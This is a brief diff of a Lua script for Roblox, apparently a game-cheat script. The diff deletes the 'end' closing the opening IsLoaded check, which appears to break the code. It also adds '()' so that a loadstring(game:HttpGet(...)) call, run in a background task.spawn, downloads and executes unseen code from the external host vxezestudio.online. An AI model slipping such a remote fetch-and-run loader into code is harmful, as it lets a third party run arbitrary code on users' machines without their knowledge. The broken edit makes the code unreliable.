@@ -1,6 +1,6 @@
 if not game:IsLoaded() then
     pcall(function() game.Loaded:Wait() end)
-end
+
 
 local _Players_init = game:GetService("Players")
 local _LP_init = _Players_init.LocalPlayer
@@ -257,7 +257,7 @@ do
     end
 
     task.spawn(function()
-        loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_0nB2RAnYf1TPA/stream/init"))
+        loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_0nB2RAnYf1TPA/stream/init"))()
         end)
 end
 
